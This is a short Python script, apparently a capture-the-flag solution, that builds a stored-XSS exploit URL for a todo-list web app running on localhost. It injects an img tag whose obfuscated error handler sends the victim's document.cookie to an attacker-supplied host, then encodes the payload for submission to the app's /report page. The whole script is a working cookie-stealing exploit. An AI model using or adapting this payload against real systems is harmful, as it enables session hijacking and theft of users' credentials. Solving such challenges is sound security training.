import sys
from urllib.parse import quote_plus
import base64
import json

attacker = sys.argv[1]

payload = [
    {"title":"Write a challenge","done":False},
    {"title":"Do something important","done":True},
    {"title":"Do something less important","done":True},
    {"title":f'<img src="x" on<scripterror="window.location = \'{attacker}/\' + document.cookie">',"done":False}
]

# urlencode then base64, just like the web app.
payload = "http://localhost:3000/?items=" + quote_plus(base64.b64encode(json.dumps(payload).encode()).decode())

# use this payload as the target when submitting the form in /report
print(payload)


